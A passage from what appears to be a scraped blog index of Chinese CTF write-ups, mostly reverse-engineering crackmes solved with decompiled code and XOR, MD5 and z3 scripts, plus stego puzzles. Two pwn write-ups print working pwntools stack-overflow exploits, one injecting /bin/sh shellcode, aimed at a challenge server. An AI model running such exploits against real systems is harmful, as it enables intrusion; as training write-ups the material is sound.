xmmword_402230; for ( i = 0i64; *v2; v3 = *v2 ) &#123; putchar(v3); ++v2; fflush(0); Sleep(0x64u); &#125; if ( a2 == 3 ) &#123; sub_401040(&quot;~checking:&quot;); sub_401080(); v5 = strcmp(*(const char **)(a3 + 4), &quot;Mirage&quot;); if ( v5 ) v5 = -(v5 &lt; 0) | 1; if ( v5 ) &#123; sub_401040(&quot;Incorrect username\\n&quot;); sub_401010(&quot;fail\\n&quot;); system(&quot;pause&quot;); &#125; sub_401040(&quot;\\nCorrect Username\\n&quot;); v6 = *(const char **)(a3 + 8); v7 = 0; if ( strlen(v6) ) &#123; do &#123; v9 = v7 &amp; 0x80000001; v8 = (v7 &amp; 0x80000001) == 0; if ( (v7 &amp; 0x80000001 &amp; 0x80000000) != 0 ) &#123; v10 = ((_BYTE)v9 - 1) | 0xFFFFFFFE; v8 = v10 == -1; v9 = v10 + 1; &#125; if ( v8 ) &#123; if ( (v6[v7] ^ 0x88) != *((_DWORD *)&amp;v17 + v7) ) &#123; v11 = &quot;\\nIncorrect password\\n&quot;; v12 = 10; do &#123; putchar(v12); ++v11; fflush(0); Sleep(0x64u); v12 = *v11; &#125; while ( *v11 ); sub_401010(&quot;fail\\n&quot;); goto LABEL_25; &#125; &#125; else if ( v9 == 1 &amp;&amp; (v6[v7] ^ 0x66) != *((_DWORD *)&amp;v17 + v7) ) &#123; sub_401040(&quot;\\nIncorrect password\\n&quot;); sub_401010(&quot;fail\\n&quot;); goto LABEL_25; &#125; ++v7; &#125; while ( v7 &lt; strlen(v6) ); &#125; v13 = &quot;~checking:&quot;; v14 = 126; do &#123; putchar(v14); ++v13; fflush(0); Sleep(0x64u); v14 = *v13; &#125; while ( *v13 ); sub_401080(); v15 = &quot;\\nCongratulations!\\n&quot;; v16 = 10; do &#123; putchar(v16); ++v15; fflush(0); Sleep(0x64u); v16 = *v15; &#125; while ( *v15 ); sub_401010(&quot;success\\n&quot;);LABEL_25: system(&quot;pause&quot;); result = 0; &#125; else &#123; sub_401010(&quot;[ERROR] Login information missing\\n&quot;); sub_401010(&quot;Usage: %s &lt;username&gt; &lt;password&gt;\\n&quot;, *(_DWORD *)a3); result = 1; &#125; return result; 显然用户名是Mirage，而密码就需要进行异或运算了。 密码下标为偶数的部分异或0x88后与固定字符串相等。 密码下标为奇数的部分异或0x66后与固定字符串相等。 逆运算脚本如下： 12345678key=[0xc5,0x25,0xdc,0x20,0xf3,0x3e,0xb8,0x14,0xd7,0x57,0xfb,0x39,0xf9,0x13,0xb9,0x12,0xed,0x39,0xfb,0x57,0xe5,0x16,0xe4,0x53,0xf5]flag=&quot;&quot;for i in range(len(key)): if i&amp;1 == 0: flag+=chr(key[i]^0x88) if i&amp;1 == 1: flag+=chr(key[i]^0x66)print flag 吃鲨鱼peid看了一下发现是c#，拖进dnspy： 123456789101112131415161718192021222324252627282930313233343536373839404142434445private void button1_Click(object sender, EventArgs e) &#123; string text = this.textBox1.Text; string[] array = new string[] &#123; &quot;69691c7bdcc3ce6d5d8a1361f22d04ac&quot;, &quot;0d61f8370cad1d412f80b84d143e1257&quot;, &quot;b9ece18c950afbfa6b0fdbfa4ff731d3&quot;, &quot;800618943025315f869e4e1f09471012&quot;, &quot;f95b70fdc3088560732a5ac135644506&quot;, &quot;4a8a08f09d37b73795649038408b5f33&quot;, &quot;03c7c0ace395d80182db07ae2c30f034&quot;, &quot;2510c39011c5be704182423e3a695e91&quot;, &quot;0cc175b9c0f1b6a831c399e269772661&quot;, &quot;4b43b0aee35624cd95b910189b3dc231&quot;, &quot;83878c91171338902e0fe0fb97a8c47a&quot;, &quot;b14a7b8059d9c055954c92674ce60032&quot;, &quot;6f8f57715090da2632453988d9a1501b&quot;, &quot;8277e0910d750195b448797616e091ad&quot;, &quot;e4da3b7fbbce2345d7772b0674a318d5&quot;, &quot;cbb184dd8e05c9709e5dcaedaa0495cf&quot; &#125;; if (text.Length &gt; 16) &#123; this.label2.Text = &quot;You are wrong!&quot;; return; &#125; for (int i = 0; i &lt; text.Length; i++) &#123; char[] array2 = new char[] &#123; &apos;H&apos; &#125;; array2[0] = text[i]; string str = new string(array2); if (array[i].CompareTo(Form1.fivefive(str)) != 0) &#123; this.label2.Text = &quot;You are wrong!&quot;; &#125; else &#123; this.label2.Text = &quot;You are right!&quot;; &#125; &#125; &#125; 找到了这里，并且发现程序中有一些地方出现了md5，把定义的array的每个字符串md5解密一下得到了flag。 Math for kids","categories":[],"tags":[]},{"title":"MCTF2018-1","slug":"MCTF2018-1","date":"2018-10-27T05:18:44.000Z","updated":"2018-10-30T15:15:21.837Z","comments":true,"path":"2018/10/27/MCTF2018-1/","link":"","permalink":"http://yoursite.com/2018/10/27/MCTF2018-1/","excerpt":"","text":"hello helloida打开： 123456789101112131415161718192021222324252627282930mov [rbp+s2], 4Dh ; &apos;M&apos;mov [rbp+var_5F], 43h ; &apos;C&apos;mov [rbp+var_5E], 54h ; &apos;T&apos;mov [rbp+var_5D], 46h ; &apos;F&apos;mov [rbp+var_5C], 7Bh ; &apos;&#123;&apos;mov [rbp+var_5B], 77h ; &apos;w&apos;mov [rbp+var_5A], 65h ; &apos;e&apos;mov [rbp+var_59], 31h ; &apos;1&apos;mov [rbp+var_58], 63h ; &apos;c&apos;mov [rbp+var_57], 6Fh ; &apos;o&apos;mov [rbp+var_56], 6Dh ; &apos;m&apos;mov [rbp+var_55], 65h ; &apos;e&apos;mov [rbp+var_54], 5Fh ; &apos;_&apos;mov [rbp+var_53], 32h ; &apos;2&apos;mov [rbp+var_52], 6Fh ; &apos;o&apos;mov [rbp+var_51], 5Fh ; &apos;_&apos;mov [rbp+var_50], 52h ; &apos;R&apos;mov [rbp+var_4F], 65h ; &apos;e&apos;mov [rbp+var_4E], 76h ; &apos;v&apos;mov [rbp+var_4D], 65h ; &apos;e&apos;mov [rbp+var_4C], 72h ; &apos;r&apos;mov [rbp+var_4B], 73h ; &apos;s&apos;mov [rbp+var_4A], 65h ; &apos;e&apos;mov [rbp+var_49], 5Fh ; &apos;_&apos;mov [rbp+var_48], 57h ; &apos;W&apos;mov [rbp+var_47], 6Fh ; &apos;o&apos;mov [rbp+var_46], 72h ; &apos;r&apos;mov [rbp+var_45], 31h ; &apos;1&apos;mov [rbp+var_44], 64h ; &apos;d&apos;mov [rbp+var_43], 7Dh ; &apos;&#125;&apos; drink coffeeluyten打开，check函数： 123456789101112131415161718192021222324public static boolean CHECK(final int input) &#123; if (input &gt; 10000000 &amp;&amp; input &lt; 99999999) &#123; int v7 = 1; int v8 = 10000000; int v9 = 1; if (Math.abs(input / 1000 % 100 - 80) == 3 &amp;&amp; input % 1000 % 927 == 0) &#123; for (int v10 = 0; v10 &lt; 4; ++v10) &#123; if (input / v7 % 10 != input / v8 % 10) &#123; v9 = 0; break; &#125; v7 *= 10; v8 /= 10; &#125; if (v9 != 1) &#123; return false; &#125; if (v9 == 1) &#123; return true; &#125; &#125; &#125; return false; &#125; 本来想用这几天在研究的z3求解的…可是前面两题到现在也没能解出来…这一题运行z3脚本一直卡住，没有任何提示orz。只好不用z3，魔改了原代码求passwd： 12345678910111213for i in range(10000000,99999999): v7 = 1 v8 = 10000000 v9 = 1 if (abs(i / 1000 % 100 - 80) == 3 and i % 1000 % 927 == 0): for j in range(4): if (i / v7 % 10 != i / v8 % 10): v9 = 0 break v7 *= 10 v8 /= 10 if (v9 == 1): print i 运行后打印出passwd，输入后得到flag。 听说你是萌新一张jpg，hexfiend打开在文件末尾得到flag。 不如…一张png，binwalk看一下： 1234DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 1332 x 747, 8-bit/color RGBA, non-interlaced830060 0xCAA6C End of Zip archive 发现是zip结尾，搜索IEND找到png的结尾，然后把后面的zip全部copy下来保存为新文件。mac直接可以解压，但是解压出来的docx啥也看不见，开虚拟机用windows看了一下发现有密码，所以应该就是伪加密了，找到第二个PK后标记有无密码的位置，把01改为00，解压后查看docx得到flag。 猜猜flag走后门吗有后门函数直接可以开shell，直接栈溢出覆盖返回地址： 1234567from pwn import *sh=remote(&quot;123.206.131.120&quot;,10001)backdoor_add=0x4006e0sh.recv()payload=&quot;a&quot;*0x58+p64(backdoor_add)sh.sendline(payload)sh.interactive() 后门？不存在的和上面一题基本差不多，不过没有后门函数了。同样的栈溢出，没开nx保护，同时会打印出存放输入的内存地址，找了个shellcode： 123456789from pwn import *sh=remote(&quot;123.206.131.120&quot;,10002)sh.recvuntil(&quot;is&quot;)sh.recv(3)add=int(sh.recv(12),16)shellcode=&quot;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot;payload=shellcode+&apos;\\x90&apos;*(0x58-len(shellcode))+p64(add)sh.sendline(payload)sh.interactive() 做出了后门也不给你走","categories":[],"tags":[]},{"title":"sus-gccc","slug":"sus-gccc","date":"2018-10-25T13:51:39.000Z","updated":"2018-11-20T13:03:12.974Z","comments":true,"path":"2018/10/25/sus-gccc/","link":"","permalink":"http://yoursite.com/2018/10/25/sus-gccc/","excerpt":"","text":".net程序，dnspy反编译一波： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// Token: 0x02000002 RID: 2public class GrayCCC&#123; // Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000458 public static void Main() &#123; Console.Write(&quot;Input the key: &quot;); uint num; if (!uint.TryParse(Console.ReadLine().Trim(), out num)) &#123; Console.WriteLine(&quot;Invalid key&quot;); return; &#125; string text = &quot;&quot;; string text2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125; &quot;; int num2 = 0; byte[] array = new byte[] &#123; 164, 25, 4, 130, 126, 158, 91, 199, 173, 252, 239, 143, 150, 251, 126, 39, 104, 104, 146, 208, 249, 9, 219, 208, 101, 182, 62, 92, 6, 27, 5, 46 &#125;; byte b = 0; while (num != 0u) &#123; char c = (char)(array[num2] ^ (byte)num ^ b); if (!text2.Contains(new string(c, 1))) &#123; Console.WriteLine(&quot;Invalid key&quot;); return; &#125; text += c; b ^= array[num2++]; num &gt;&gt;= 1; &#125; if (text.Substring(0, 5) != &quot;FLAG&#123;&quot; || text.Substring(31, 1) != &quot;&#125;&quot;) &#123; Console.WriteLine(&quot;Invalid key&quot;); return; &#125; Console.WriteLine(&quot;Your flag is: &quot; + text); &#125;&#125; 定义了uint类型变量num，text[i]=array[i]^(num&amp;0xff)^b，b=array[0]^...^array[i]，最后要求text的前五位为FLAG{，最后一位为}，并且每一位都是大写字母，题目推荐使用z3求解。脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from z3 import *num=BitVec(&quot;num&quot;,33)array=[ 164, 25, 4, 130, 126, 158, 91, 199, 173, 252, 239, 143, 150, 251, 126, 39, 104, 104, 146, 208, 249, 9, 219, 208, 101, 182, 62, 92, 6, 27, 5, 46]b=range(32)for i in range(32): temp=0 for j in range(i): temp^=array[j] b[i]=tempsolver=Solver()solver.add(array[0]^(num&amp;0xff)^b[0]==ord(&apos;F&apos;))solver.add(array[1]^((num&gt;&gt;1)&amp;0xff)^b[1]==ord(&apos;L&apos;))solver.add(array[2]^((num&gt;&gt;2)&amp;0xff)^b[2]==ord(&apos;A&apos;))solver.add(array[3]^((num&gt;&gt;3)&amp;0xff)^b[3]==ord(&apos;G&apos;))solver.add(array[4]^((num&gt;&gt;4)&amp;0xff)^b[4]==ord(&apos;&#123;&apos;))for i in range(5,31): solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&lt;=126) solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&gt;=32)solver.add(array[31]^((num&gt;&gt;31)&amp;0xff)^b[31]==ord(&apos;&#125;&apos;))if solver.check()==sat : print solver.model()right_num=3658134498flag=&quot;&quot;for i in range(32): flag+=chr(array[i]^((right_num&gt;&gt;i)&amp;0xff)^b[i])print flag","categories":[],"tags":[]},{"title":"实验吧-3","slug":"实验吧-3","date":"2018-10-24T10:40:16.000Z","updated":"2018-11-20T10:05:40.278Z","comments":true,"path":"2018/10/24/实验吧-3/","link":"","permalink":"http://yoursite.com/2018/10/24/实验吧-3/","excerpt":"","text":"逆向观察直接拖ida里打开，主函数： 12345678910111213141516171819202122232425 v10 = __readfsqword(0x28u); if ( argc &lt;= 1 ) &#123; puts(&quot;usage ./rev50 password&quot;); &#125; else &#123; src = &apos;sedecrem&apos;; v6 = 0; v7 = 0; v8 = 0; memcpy(&amp;dest, &amp;src, 9uLL); for ( i = 0; i &lt;= 999; ++i ) &#123; if ( !strcmp(argv[1], (&amp;dict)[i]) &amp;&amp; !strcmp(&amp;dest, (&amp;dict)[i]) ) &#123; puts(&quot;Good password ! &quot;); goto LABEL_10; &#125; &#125; puts(&quot;Bad ! password&quot;); &#125;LABEL_10: puts(&amp;byte_40252A); return 0; Good password的判断条件就是输入=src，需要注意的是这里的字符串是应该倒过来看的，所以应该是mercedes。 bitwise下载下来一个rar，解压后可以得到一个java程序和一个py程序，看上去应该功能是一样的，不会java所以就分析py吧： 1234567891011121314151617181920212223#!/usr/bin/env pythonuser_submitted = raw_input(&quot;Enter Password: &quot;)if len(user_submitted) != 10: print &quot;Wrong&quot; exit()verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]user_arr = []for char in user_submitted: # &apos;&lt;&lt;&apos; is left bit shift # &apos;&gt;&gt;&apos; is right bit shift # &apos;|&apos; is bit-wise or # &apos;^&apos; is bit-wise xor # &apos;&amp;&apos; is bit-wise and user_arr.append( (((ord(char) &lt;&lt; 5) | (ord(char) &gt;&gt; 3)) ^ 111) &amp; 255 )if (user_arr == verify_arr): print &quot;Success&quot;else: print &quot;Wrong&quot; 爆破一发： 12345678import stringflag=&quot;&quot;verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]for i in range(len(verify_arr)): for j in string.printable: if (((ord(j) &lt;&lt; 5) | (ord(j) &gt;&gt; 3)) ^ 111) &amp; 255 == verify_arr[i] : flag+=jprint flag Byte Code下载得到一个.class文件，用jd-gui试试,结果会报错INTERNAL ERROR，百度了一下,用luyten试试打开了： 12345678910111213141516171819202122232425import java.io.*;class Authenticator&#123; public static char[] key; public static void main(final String[] array) &#123; (Authenticator.key = new char[10])[0] = &apos;A&apos;; Authenticator.key[1] = &apos;o&apos;; Authenticator.key[2] = &apos;J&apos;; Authenticator.key[3] = &apos;k&apos;; Authenticator.key[4] = &apos;V&apos;; Authenticator.key[5] = &apos;h&apos;; Authenticator.key[6] = &apos;L&apos;; Authenticator.key[7] = &apos;w&apos;; Authenticator.key[8] = &apos;U&apos;; Authenticator.key[9] = &apos;R&apos;; final Console console = System.console(); for (String line = &quot;&quot;; !line.equals(&quot;ThisIsth3mag1calString4458&quot;); line = console.readLine(&quot;Enter password:&quot;, new Object[0])) &#123;&#125; for (int i = 0; i &lt; Authenticator.key.length; ++i) &#123; System.out.print(Authenticator.key[i]); &#125; System.out.println(&quot;&quot;); &#125;&#125; 虽然不会java但是这么简单的代码还是可以看看的，AoJkVhLwUR就是输入正确时得到的flag。（luyten真给力啊 CFG to C汇编代码和c代码配对就行了，不过其实根据逻辑图就能判断。 对应 1234567int loop(int a) &#123; while (a &gt;= 0) &#123; a--; &#125; return a; &#125; 对应 12345678int control(int a, int b) &#123; if (a &gt; b) return b; else return a; &#125; 对应 12345678int for_loop(int a, int b, int c) &#123; int i; for(i = 0; i &lt; b; i++) a = c + i; return a; &#125; 对应 1234int modulo(int a, int b) &#123; return b % a; &#125; catalyst-systemida打开，main函数中关键部分： 1234567891011121314151617181920printf(&quot;Username: &quot;);__isoc99_scanf(&quot;%s&quot;, v8);printf(&quot;Password: &quot;, v8);__isoc99_scanf(&quot;%s&quot;, v7);printf(&quot;Logging in&quot;, v7);fflush(stdout);for ( j = 0; j &lt;= 29; ++j )&#123; v5 = rand(); sleep(v5 % (j + 1)); putchar(&apos;.&apos;); fflush(stdout);&#125;putchar(10);sub_400C9A((__int64)v8);sub_400CDD(v8);sub_4008F7((__int64)v8);sub_400977(v8, v7);sub_400876((__int64)v8, (__int64)v7);return 0LL; 输入账号密码后接下来几个函数进行账号密码验证与输出flag。 sub_400876就是输出flag的函数： 1234567char *s; // [rsp+0h] [rbp-30h]int i; // [rsp+1Ch] [rbp-14h]printf(&quot;your flag is: ALEXCTF&#123;&quot;, a2, a1);for ( i = 0; i &lt; strlen(s); ++i ) putchar((unsigned __int8)byte_6020A0[i] ^ s[i]);return puts(&quot;&#125;&quot;); 可以看见flag的格式了，不过不知道s处的字符串是啥，只能看看上面的函数。 sub_400c9a限制了账号的长度大于8小于16且为4的倍数，所以长度就是12。 sub_400cdd函数： 1234567891011v4 = *a1;v3 = a1[1];v2 = a1[2];if ( v4 - v3 + v2 != 0x5C664B56 || v3 + 3 * (v2 + v4) != 0x2E700C7B2LL || (result = 0x32AC30689A6AD314LL, v2 * v3 != 0x32AC30689A6AD314LL) )&#123; puts(&quot;invalid username or password&quot;); exit(0);&#125;return result; 对账号进行了限制，给了三个条件表达式，这里可以使用z3求解,解得v4=0x6f65635f，v3=0x7473796c,v2=0x61746163。 sub_4008fc函数限制了账号的字符位于’`’与’z’之间或者等于’_’。 sub_400977通过随机函数生成密码，这里要用linux运行才是正确的。 sub_400876密码异或一个数组得到flag。","categories":[],"tags":[]},{"title":"实验吧-2","slug":"实验吧-2","date":"2018-10-23T09:14:59.000Z","updated":"2018-10-26T16:11:24.609Z","comments":true,"path":"2018/10/23/实验吧-2/","link":"","permalink":"http://yoursite.com/2018/10/23/实验吧-2/","excerpt":"","text":"有一个程序加密得到如下密文又是pyc文件，反编译之后： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889# 2018.10.23 17:05:34 CST# Embedded file name: ./rev200.pyimport sysfrom hashlib import md5import base64from time import timefrom datetime import datetimeUC_KEY = &apos;123456789&apos;def authcode(string, operation = &apos;DECODE&apos;, key = UC_KEY, expiry = 0): ckey_length = 4 if key == &apos;&apos;: key = md5(UC_KEY.encode(&apos;utf-8&apos;)).hexdigest() else: key = md5(key.encode(&apos;utf-8&apos;)).hexdigest() keya = md5(key[0:16].encode(&apos;utf-8&apos;)).hexdigest() keyb = md5(key[16:32].encode(&apos;utf-8&apos;)).hexdigest() if ckey_length == 0: keyc = &apos;&apos; elif operation == &apos;DECODE&apos;: keyc = string[0:ckey_length] elif operation == &apos;ENCODE&apos;: keyc = md5(str(datetime.now().microsecond).encode(&apos;utf-8&apos;)).hexdigest()[-ckey_length:] else: return cryptkey = keya + md5((keya + keyc).encode(&apos;utf-8&apos;)).hexdigest() key_length = len(cryptkey) if operation == &apos;DECODE&apos;: string = base64.b64decode(string[ckey_length:]) elif operation == &apos;ENCODE&apos;: if expiry == 0: string = &apos;0000000000&apos; + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string else: string = &apos;%10d&apos; % (expiry + int(time())) + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string else: return string_length = len(string) result = &apos;&apos; box = range(256) rndkey = [0] * 256 for i in range(256): rndkey[i] = ord(cryptkey[i % key_length]) j = 0 for i in range(256): j = (j + box[i] + rndkey[i]) % 256 tmp = box[i] box[i] = box[j] box[j] = tmp a = j = 0 for i in range(string_length): a = (a + 1) % 256 j = (j + box[a]) % 256 tmp = box[a] box[a] = box[j] box[j] = tmp result += chr(ord(string[i]) ^ box[(box[a] + box[j]) % 256]) if operation == &apos;DECODE&apos;: if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0: if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]: return result[26:] else: return &apos;&apos; else: return &apos;&apos; else: return keyc + base64.b64encode(result)if __name__ == &apos;__main__&apos;: if len(sys.argv) &lt; 3: exit(1) ex = 20 for i in range(1, len(sys.argv), 2): a = sys.argv[i] b = sys.argv[i + 1] if a == &apos;-t&apos;: ex = int(b) elif a == &apos;-e&apos;: encoded = authcode(b, &apos;ENCODE&apos;, expiry=ex) print encoded elif a == &apos;-d&apos;: decoded = authcode(b, &apos;DECODE&apos;, expiry=ex) print decoded# okay decompyling reverse300.pyc # decompiled 1 files: 1 okay, 0 failed, 0 verify failed# 2018.10.23 17:05:34 CST 要求是输入至少3个参数，第一个输入-d的话就是解密，第二个参数就输入题目给的字符串就行了，不知道第三个参数该输入啥，直接把if len(sys.argv) &lt; 3: exit(1)给nop掉了。 运行发现程序没有结果，可能是解密函数出了一些问题： 12345678910if operation == &apos;DECODE&apos;: if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0: if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]: return result[26:] else: return &apos;&apos; else: return &apos;&apos;else: return keyc + base64.b64encode(result) 最里面的return result[26:]可能就是正确结果，把所有return替换成这个之后运行得到flag。 Keylead（ASIS CTF 2015）下载下来是个7z文件，后缀改为7z解压后用ida打开，从主函数发现是一个掷🎲小游戏，和上一篇里的🎲要求掷的数字也是一样的，不过这个要用gdb调试，无奈gdb鶸，只能用ida看看输出flag的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197 v11 = 0; v7 = 0; while ( v11 != 1 ) &#123; putchar(byte_601680[14 * v11++]); do &#123; while ( v7 &lt;= 1 ) putchar(byte_601680[20 * v11 - 8 * v7++]); v1 = v7 + 1; v2 = 3 * v11; putchar(byte_601680[2 * v2 + 11 + v1]); v2 *= 5; v8 = v1 - 1; putchar(byte_601680[2 * v2 + v8]); v12 = v2 / 3; while ( 1 ) &#123; while ( 1 ) &#123;LABEL_12: if ( !v8 ) &#123; putchar(byte_601680[2 * v12]); v15 = v12 ^ 2; while ( 2 ) &#123; for ( i = 1; i &lt;= 9; ++i ) putchar(byte_601680[10 * (i % 2) + 3 + v15]); v13 = v15 + 1;LABEL_44: putchar(byte_601680[v13 / 3]); if ( i == 10 ) &#123; v13 += 2 * v13 + 13; i = 19; goto LABEL_33; &#125; if ( i == 2 ) &#123; i = v13-- + 2; goto LABEL_4; &#125; if ( (unsigned int)(i - 22) &lt;= 0xA ) &#123; v14 = v13 - 3; for ( j = i - v14; ; j = 8 ) &#123;LABEL_58: putchar(byte_601680[v14 + 1]); v16 = v14 + 1; if ( j == 11 ) &#123; v13 = (v16 + 14) / 2; i = 11 * (v13 / 6); goto LABEL_44; &#125; if ( j != 13 ) break; v12 = v16 + 8; v8 = 2;LABEL_51: while ( 2 ) &#123; putchar(byte_601680[v12 - 10]); if ( v8 == v12 ) &#123; v4 = v8 + 2; v5 = v12 + 2; putchar(byte_601680[v5 / 2 + v4 / 5]); i = v4 / 2; putchar(byte_601680[i / 5 + v5]); v13 = v5 + i - 1 + v5; while ( 1 ) &#123;LABEL_33: putchar(byte_601680[v13 - 19]); if ( i == 2 ) &#123; v3 = v13 + 1; putchar(byte_601680[v3 / 2 - 3]); v13 = v3 / 5 + 2; i = 2; goto LABEL_44; &#125; if ( i &lt;= 2 ) break; if ( i == 10 ) &#123; v12 = v13 - 31; v8 = 9; goto LABEL_51; &#125; if ( i != 19 ) goto LABEL_44; i = 2; &#125; if ( i == 1 ) &#123; v8 = 17; v12 = v13 % 5 - 17 + v13;LABEL_20: putchar(byte_601680[v12 - v8 + 9]); v12 += ~v8++; continue; &#125; goto LABEL_44; &#125; break; &#125; if ( v8 != 9 ) &#123; if ( v8 != 2 ) goto LABEL_12; j = 2; v16 = v12 - 18;LABEL_64: v6 = 9 * j; putchar(byte_601680[v16 / 2 + v6 + v6 % 10]); v11 = v16 + 1; v7 = v6 % 10; goto LABEL_21; &#125; putchar(byte_601680[v12 - 16]); v14 = v12 / 2; &#125; if ( j == 8 ) &#123; v15 = v16 + 1; i = 7; continue; &#125; goto LABEL_64; &#125; goto LABEL_4; &#125; &#125; if ( v8 == 2 ) break; if ( v12 == 7 ) &#123; putchar(byte_601680[21 - v8]); v13 = 49; i = v8 / 3; goto LABEL_33; &#125; if ( v8 != 3 ) goto LABEL_20; putchar(byte_601680[2 * (v12 / 3)]); v13 = v12 / 3; i = 9; do &#123; while ( 1 ) &#123; if ( v13 == 10 ) &#123; putchar(byte_601680[i + 8]); v14 = 9; j = i + 1; goto LABEL_58; &#125; if ( v13 == 11 ) &#123; putchar(byte_601680[i / 7]); v13 = i-- - 11; &#125;LABEL_4: if ( i != 9 ) break; putchar(byte_601680[v13 * v13 + 7]); v13 = v13 * v13 + 1; i = 10; &#125; &#125; while ( i != 13 ); putchar(byte_601680[2 * v13 + 12]); v8 = 3; v12 = 3 * v13; &#125; putchar(byte_601680[3 * v12 + 1]); v0 = v12 * v12; putchar(byte_601680[v0 - 15]); v11 = v0 - 15; v7 = 4; putchar(byte_601680[4]);LABEL_21: if ( v7 != 4 ) break; putchar(byte_601680[v11 + 6]); v12 = v11 - 3; v8 = 3; &#125; &#125; while ( v7 != 8 ); putchar(byte_601680[2 * v11 + 32]); &#125; …有点烦，还是先学习下gdb吧。 学习后发现用ida远程调试就可以了，并不一定要用gdb，调试时把所有跳转到失败情况的jle之类的nop掉，这样运行到最后就会输出flag了。 分道扬镳题目说是一个迷宫，ida打开，用字符串查看地图： 12345678********* * ** * ** ** * ** ** * #* ** **** ** ********* 找到调用这个地图的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182 v5 = 0; memset(&amp;v6, 0, 0x74u); v7 = 0; v8 = 0; strcpy(&amp;v2, &quot;********* * ** * ** ** * ** ** * #* ** **** ** *********&quot;); v1 = &amp;v3; printf(&quot;Please input your key:\\n&quot;); gets(&amp;v5); if ( strlen(&amp;v5) != 22 ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(1); &#125; v11 = 0; do &#123; v10 = *(&amp;v5 + v11); if ( v10 != &apos;k&apos; &amp;&amp; v10 != &apos;j&apos; &amp;&amp; v10 != &apos;h&apos; &amp;&amp; v10 != &apos;l&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(2); &#125; v9 = *(&amp;v5 + v11); switch ( v9 ) &#123; case &apos;h&apos;: if ( --v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || (result = (char *)*v1, result == (char *)&apos;*&apos;) ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(3); &#125; if ( *v1 == &apos;#&apos; ) &#123;LABEL_41: printf(&quot;Good!\\n&quot;); system(&quot;pause&quot;); exit(0); &#125; break; case &apos;j&apos;: v1 += 8; if ( v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(3); &#125; result = (char *)*v1; if ( result == (char *)&apos;#&apos; ) goto LABEL_41; break; case &apos;k&apos;: v1 -= 8; if ( v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(3); &#125; result = v1; if ( *v1 == &apos;#&apos; ) goto LABEL_41; break; default: if ( ++v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(4); &#125; result = v1; if ( *v1 == &apos;#&apos; ) goto LABEL_41; break; &#125; ++v11; &#125; while ( v11 &lt; 25 ); return result; 分析得j是向下，k是向上，h向左，l向右，不能走到*上，走到#就走出了迷宫，结合地图得到答案。 10000000ida打开，main函数： 12345678910111213141516171819202122232425262728__main();v17 = 0;memset(&amp;v18, 0, 0x10u);memset(&amp;v4, 0, 0x14u);v4 = -26;v5 = -20;v6 = -31;v7 = -25;v8 = -70;v9 = -12;v10 = -27;v11 = -13;v12 = -12;v13 = -12;v14 = -27;v15 = -13;v16 = -12;v19 = 0;puts(asc_403024);scanf(&quot;%s&quot;, &amp;v17);LOBYTE(v19) = 0;while ( *((_BYTE *)&amp;v17 + v19) ) *((_BYTE *)&amp;v17 + v19++) |= 0x80u;if ( !strcmp((const char *)&amp;v17, &amp;v4) ) printf(&quot;good&quot;);else printf(&quot;wrong&quot;);return 0; 逻辑很简单，输入|=0x80后与v4相等就ok了，不过不清楚|可不可以逆运算，来一发爆破吧： 12345678import stringv4=[0xe6,0xec,0xe1,0xe7,0xba,0xf4,0xe5,0xf3,0xf4,0xf4,0xe5,0xf3,0xf4]flag=&quot;&quot;for i in range(len(v4)): for j in string.printable: if ord(j)|0x80==v4[i]: flag+=jprint flag 需要注意的是ida打开时v4的值默认显示的是十进制负数……如果用这个来爆破是不会得到结果的，转换成十六进制后变成正数（鶸也不知道为啥），随后就可以得到flag了。","categories":[],"tags":[]},{"title":"实验吧-1","slug":"实验吧-1","date":"2018-10-22T14:37:21.000Z","updated":"2018-10-22T14:37:34.637Z","comments":true,"path":"2018/10/22/实验吧-1/","link":"","permalink":"http://yoursite.com/2018/10/22/实验吧-1/","excerpt":"","text":"证明自己吧ida打开，定位到关键函数： 1234567891011121314151617181920212223242526272829303132 v5 = 